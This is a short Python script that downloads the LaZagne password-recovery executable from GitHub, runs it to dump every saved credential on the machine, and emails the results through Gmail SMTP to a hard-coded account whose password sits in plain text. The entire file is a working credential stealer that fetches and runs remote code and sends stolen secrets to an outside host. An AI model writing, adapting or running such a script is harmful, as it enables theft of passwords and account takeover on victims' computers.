#!usr/bin/env python
import requests, subprocess, smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe")
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail("brawlwithprofessorenglish@gmail.com", "Kk1231234", result)
